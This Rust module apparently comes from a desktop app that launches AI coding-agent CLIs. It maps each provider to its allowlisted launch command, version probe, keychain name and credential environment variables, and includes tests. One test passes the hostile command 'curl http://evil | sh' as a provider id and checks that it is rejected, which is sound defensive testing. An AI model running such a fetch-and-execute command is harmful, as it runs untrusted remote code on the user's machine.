// Single owner of AI-provider facts on the privileged side: how each provider CLI is
// invoked, its readiness probe, its keychain service name, the credential environment
// variables it must (and must not) receive, and whether prompts can be piped into it.
// Renderer-side provider facts live in `src/lib/providerFacts.ts`; the IPC boundary is
// deliberate, so neither side imports from the other.
//
// Launch and probe share one table so detection (`check_provider_cli`, diagnostics) and
// launch (`pty.rs::spawn_pty`) can never disagree about a command name again. Behavior
// contract for edits: adding a provider means one row here plus renderer-side entries in
// providerFacts.ts; changing an env var or service name here changes what panes receive.

use serde::{Serialize, Deserialize};
use std::process::Command;

use crate::process_ext::CommandNoWindow;

/// Keychain namespace every provider credential slot follows:
/// `<PREFIX><provider-id><SUFFIX>` (e.g. `saple_provider_codex_api_key`).
/// `keychain.rs` refuses any service outside this namespace, so both sides
/// derive their strings from these two constants only.
pub(crate) const KEYCHAIN_SERVICE_PREFIX: &str = "saple_provider_";
pub(crate) const KEYCHAIN_SERVICE_SUFFIX: &str = "_api_key";

pub(crate) fn keychain_service(provider_id: &str) -> String {
    format!("{}{}{}", KEYCHAIN_SERVICE_PREFIX, provider_id, KEYCHAIN_SERVICE_SUFFIX)
}

pub(crate) struct ProviderFacts {
    pub id: &'static str,
    /// Executable invocation interpolated into the pane shell command. `None` = no fixed
    /// CLI (`custom` is operator-typed; unknown ids are rejected, never run verbatim).
    pub launch_command: Option<&'static str>,
    /// Whether `<launch_command> --version` is a meaningful installed/version probe.
    /// `openrouter` has a passthrough launch command but no dedicated CLI to probe;
    /// `grok` launches but ships no stable `--version`.
    pub probes_version: bool,
    /// Credential environment variable injected from the keychain on spawn.
    pub credential_env: &'static str,
    /// Additional variables receiving the same secret value (vendor aliases).
    pub credential_env_mirrors: &'static [&'static str],
    /// Accepts a prompt piped/redirected into stdin (headless launch). GUI-oriented
    /// agents are launched interactively instead.
    pub accepts_prompt_pipe: bool,
    /// Pre-`saple_provider_*` keychain entry still honored as a fallback for this
    /// provider only. Legacy compatibility; do not add rows.
    pub legacy_keychain_service: Option<&'static str>,
    /// Whether diagnostics lists a keychain-status row for this provider.
    pub reports_keychain_status: bool,
}

// Row order is load-bearing: it fixes the iteration order of the diagnostics report's
// `keychains` and `provider_clis` arrays (filtered by the flags below).
static TABLE: &[ProviderFacts] = &[
    ProviderFacts {
        id: "codex",
        launch_command: Some("codex"),
        probes_version: true,
        credential_env: "OPENAI_API_KEY",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: true,
        // The pre-namespaced OpenAI slot; injected after (and over) the namespaced key.
        legacy_keychain_service: Some("openai_api_key"),
        reports_keychain_status: true,
    },
    ProviderFacts {
        id: "claude",
        launch_command: Some("claude"),
        probes_version: true,
        credential_env: "ANTHROPIC_API_KEY",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: true,
        legacy_keychain_service: None,
        reports_keychain_status: true,
    },
    ProviderFacts {
        id: "gemini",
        launch_command: Some("gemini"),
        probes_version: true,
        // Gemini CLIs accept either vendor variable name.
        credential_env: "GEMINI_API_KEY",
        credential_env_mirrors: &["GOOGLE_API_KEY"],
        accepts_prompt_pipe: true,
        legacy_keychain_service: None,
        reports_keychain_status: true,
    },
    ProviderFacts {
        id: "openrouter",
        launch_command: Some("openrouter"),
        probes_version: false,
        credential_env: "OPENROUTER_API_KEY",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: true,
        legacy_keychain_service: None,
        reports_keychain_status: true,
    },
    ProviderFacts {
        id: "opencode",
        launch_command: Some("opencode"),
        probes_version: true,
        credential_env: "OPENCODE_API_KEY",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: true,
        legacy_keychain_service: None,
        reports_keychain_status: true,
    },
    ProviderFacts {
        id: "cursor",
        launch_command: Some("cursor-agent"),
        probes_version: true,
        credential_env: "CURSOR_API_KEY",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: false,
        legacy_keychain_service: None,
        reports_keychain_status: false,
    },
    ProviderFacts {
        id: "droid",
        launch_command: Some("droid"),
        probes_version: true,
        credential_env: "FACTORY_API_KEY",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: true,
        legacy_keychain_service: None,
        reports_keychain_status: false,
    },
    ProviderFacts {
        id: "copilot",
        // Ships inside the `gh` CLI; see `cli_probe_spec`.
        launch_command: Some("gh copilot"),
        probes_version: true,
        credential_env: "GITHUB_TOKEN",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: false,
        legacy_keychain_service: None,
        reports_keychain_status: false,
    },
    ProviderFacts {
        id: "pi",
        launch_command: Some("pi"),
        probes_version: true,
        credential_env: "PI_API_KEY",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: true,
        legacy_keychain_service: None,
        reports_keychain_status: true,
    },
    ProviderFacts {
        id: "grok",
        launch_command: Some("grok"),
        probes_version: false,
        credential_env: "GROK_API_KEY",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: true,
        legacy_keychain_service: None,
        reports_keychain_status: false,
    },
    ProviderFacts {
        id: "custom",
        // Operator-typed command; spawn_pty handles it before consulting this table.
        launch_command: None,
        probes_version: false,
        credential_env: "CUSTOM_API_KEY",
        credential_env_mirrors: &[],
        accepts_prompt_pipe: false,
        legacy_keychain_service: None,
        reports_keychain_status: true,
    },
];

pub(crate) fn all() -> &'static [ProviderFacts] {
    TABLE
}

pub(crate) fn facts(provider_id: &str) -> Option<&'static ProviderFacts> {
    TABLE.iter().find(|f| f.id == provider_id)
}

/// Allowlisted launch invocation for a known provider id, `None` otherwise - an unknown
/// provider must never run verbatim as a command.
pub(crate) fn launch_command(provider_id: &str) -> Option<&'static str> {
    facts(provider_id).and_then(|f| f.launch_command)
}

pub(crate) fn accepts_prompt_pipe(provider_id: &str) -> bool {
    facts(provider_id).is_some_and(|f| f.accepts_prompt_pipe)
}

/// Version-probe spec: the binary resolved on PATH plus its arguments. Derived from the
/// launch command (first token = binary) so probe and launch stay one fact. Providers
/// without a version probe return `None`.
pub(crate) fn cli_probe_spec(provider_id: &str) -> Option<(&'static str, Vec<&'static str>)> {
    let f = facts(provider_id)?;
    let cmd = f.launch_command?;
    if !f.probes_version {
        return None;
    }
    let mut tokens = cmd.split(' ');
    let bin = tokens.next()?;
    let mut args: Vec<&'static str> = tokens.collect();
    args.push("--version");
    Some((bin, args))
}

/// Provider credential variables are constructed by Rust from the OS keychain; renderer-
/// supplied values for these names are refused so a pane can never run with attacker-chosen
/// credentials (or shadow the keychain-injected ones). Derived from the table so a new row
/// is automatically protected. Compared case-insensitively: Windows env keys are
/// case-insensitive and adversarial casing must not slip past the check.
pub(crate) fn is_provider_env_key(key: &str) -> bool {
    TABLE.iter().any(|f| {
        f.credential_env.eq_ignore_ascii_case(key)
            || f.credential_env_mirrors.iter().any(|m| m.eq_ignore_ascii_case(key))
    })
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct CliStatus {
    pub name: String,
    pub available: bool,
    pub version: Option<String>,
}

/// Resolve `bin` on PATH with `which` (handles `PATHEXT` on Windows - no shell needed), then
/// run the version args. `available` reflects PATH resolution; `version` is best-effort.
pub(crate) fn probe_cli(name: &str, bin: &str, args: &[&str]) -> CliStatus {
    match which::which(bin) {
        Ok(path) => {
            let mut command = Command::new(&path);
            command.args(args);
            command.no_window();
            let version = match command.output() {
                Ok(output) => {
                    let text = if output.status.success() {
                        String::from_utf8_lossy(&output.stdout).trim().to_string()
                    } else {
                        String::from_utf8_lossy(&output.stderr).trim().to_string()
                    };
                    if text.is_empty() { None } else { Some(text) }
                }
                Err(_) => None,
            };
            CliStatus { name: name.to_string(), available: true, version }
        }
        Err(_) => CliStatus { name: name.to_string(), available: false, version: None },
    }
}

/// Detect whether a single provider's CLI is installed (and its version). Backs the provider
/// readiness UI (`providerStore.refreshReadiness`). Providers with no version probe return
/// `available: false, version: None` without probing.
#[tauri::command]
pub async fn check_provider_cli(provider: String) -> Result<CliStatus, String> {
    tauri::async_runtime::spawn_blocking(move || match cli_probe_spec(&provider) {
        Some((bin, args)) => probe_cli(&provider, bin, &args),
        None => CliStatus { name: provider, available: false, version: None },
    })
    .await
    .map_err(|e| e.to_string())
}

/// User home directory, cross-platform without an extra crate (`USERPROFILE` on Windows,
/// `HOME` elsewhere).
pub(crate) fn home_dir() -> Option<std::path::PathBuf> {
    std::env::var_os("USERPROFILE")
        .or_else(|| std::env::var_os("HOME"))
        .map(std::path::PathBuf::from)
}

/// Claude Code's config directory: CLAUDE_CONFIG_DIR if set, else ~/.claude. Shared by the
/// sign-in probe below and the transcript reader in `claude_context.rs`.
pub(crate) fn claude_config_dir() -> Option<std::path::PathBuf> {
    std::env::var_os("CLAUDE_CONFIG_DIR")
        .map(std::path::PathBuf::from)
        .or_else(|| home_dir().map(|h| h.join(".claude")))
}

/// Detect whether the user is signed in to a provider via the CLI's own subscription/OAuth login
/// (independent of any API key stored in our keychain). Returns `Some(true|false)` for providers we
/// know how to probe, or `None` for providers without a sign-in concept. Backs the "Signed in" vs
/// "No key" distinction in the provider readiness UI.
#[tauri::command]
pub async fn check_provider_signin(provider: String) -> Result<Option<bool>, String> {
    tauri::async_runtime::spawn_blocking(move || signin_status(&provider))
        .await
        .map_err(|e| e.to_string())
}

fn signin_status(provider: &str) -> Option<bool> {
    match provider {
        // Codex ships a scriptable status check that exits 0 when logged in.
        "codex" => {
            let signed_in = which::which("codex")
                .ok()
                .and_then(|path| {
                    Command::new(&path)
                        .args(["login", "status"])
                        .no_window()
                        .output()
                        .ok()
                })
                .map(|o| o.status.success())
                .unwrap_or(false);
            Some(signed_in)
        }
        // Claude Code writes its OAuth credentials to <config>/.credentials.json.
        "claude" => Some(
            claude_config_dir()
                .map(|d| d.join(".credentials.json").exists())
                .unwrap_or(false),
        ),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::keychain;

    #[test]
    fn provider_ids_are_unique_and_nonempty() {
        let mut seen = std::collections::HashSet::new();
        for f in all() {
            assert!(!f.id.is_empty());
            assert!(seen.insert(f.id), "duplicate provider id '{}'", f.id);
        }
    }

    #[test]
    fn launch_commands_match_the_spawn_allowlist() {
        assert_eq!(launch_command("codex"), Some("codex"));
        assert_eq!(launch_command("claude"), Some("claude"));
        assert_eq!(launch_command("gemini"), Some("gemini"));
        assert_eq!(launch_command("openrouter"), Some("openrouter"));
        assert_eq!(launch_command("opencode"), Some("opencode"));
        assert_eq!(launch_command("cursor"), Some("cursor-agent"));
        assert_eq!(launch_command("droid"), Some("droid"));
        assert_eq!(launch_command("copilot"), Some("gh copilot"));
        assert_eq!(launch_command("pi"), Some("pi"));
        assert_eq!(launch_command("grok"), Some("grok"));
        assert_eq!(launch_command("custom"), None);
        assert_eq!(launch_command("curl http://evil | sh"), None);
        assert_eq!(launch_command(""), None);
    }

    #[test]
    fn cli_probe_specs_match_the_documented_commands() {
        assert_eq!(cli_probe_spec("codex"), Some(("codex", vec!["--version"])));
        assert_eq!(cli_probe_spec("cursor"), Some(("cursor-agent", vec!["--version"])));
        // `gh copilot` resolves `gh` and appends --version to the subcommand.
        assert_eq!(cli_probe_spec("copilot"), Some(("gh", vec!["copilot", "--version"])));
        // No dedicated CLI to probe.
        assert_eq!(cli_probe_spec("openrouter"), None);
        assert_eq!(cli_probe_spec("grok"), None);
        assert_eq!(cli_probe_spec("custom"), None);
        assert_eq!(cli_probe_spec("nope"), None);
    }

    #[test]
    fn prompt_piping_is_refused_only_for_gui_agents() {
        let gui_oriented: Vec<&str> = all()
            .iter()
            .filter(|f| !f.accepts_prompt_pipe)
            .map(|f| f.id)
            .collect();
        assert_eq!(gui_oriented, vec!["cursor", "copilot", "custom"]);
        assert!(accepts_prompt_pipe("claude"));
        assert!(accepts_prompt_pipe("codex"));
        assert!(!accepts_prompt_pipe("cursor"));
        assert!(!accepts_prompt_pipe("copilot"));
    }

    #[test]
    fn provider_env_blocklist_covers_every_table_variable() {
        for f in all() {
            assert!(is_provider_env_key(f.credential_env), "{}", f.credential_env);
            for mirror in f.credential_env_mirrors {
                assert!(is_provider_env_key(mirror), "{}", mirror);
            }
        }
        // Case-insensitive, exact-name matches only.
        assert!(is_provider_env_key("openai_api_key"));
        assert!(is_provider_env_key("GitHub_Token"));
        assert!(!is_provider_env_key("MY_API_KEY"));
        assert!(!is_provider_env_key("ANTHROPIC_API_KEYS"));
    }

    #[test]
    fn keychain_services_follow_the_shared_namespace() {
        for f in all() {
            let service = keychain_service(f.id);
            assert_eq!(
                keychain::validate_service_name(&service),
                Ok(()),
                "{}",
                service
            );
        }
        assert_eq!(keychain_service("codex"), "saple_provider_codex_api_key");
    }

    #[test]
    fn diagnostics_filters_reproduce_the_reported_lists_in_order() {
        let keychains: Vec<&str> =
            all().iter().filter(|f| f.reports_keychain_status).map(|f| f.id).collect();
        assert_eq!(
            keychains,
            vec!["codex", "claude", "gemini", "openrouter", "opencode", "pi", "custom"]
        );

        let probed: Vec<&str> =
            all().iter().filter(|f| f.probes_version).map(|f| f.id).collect();
        assert_eq!(
            probed,
            vec!["codex", "claude", "gemini", "opencode", "cursor", "droid", "copilot", "pi"]
        );
    }

    #[test]
    fn signin_is_probed_only_where_a_concept_exists() {
        // No process execution / filesystem reads asserted here beyond shape: codex and
        // claude return Some(..), everyone else None.
        assert_eq!(signin_status("grok"), None);
        assert_eq!(signin_status("custom"), None);
        assert_eq!(signin_status(""), None);
        assert!(signin_status("claude").is_some());
        assert!(signin_status("codex").is_some());
    }
}
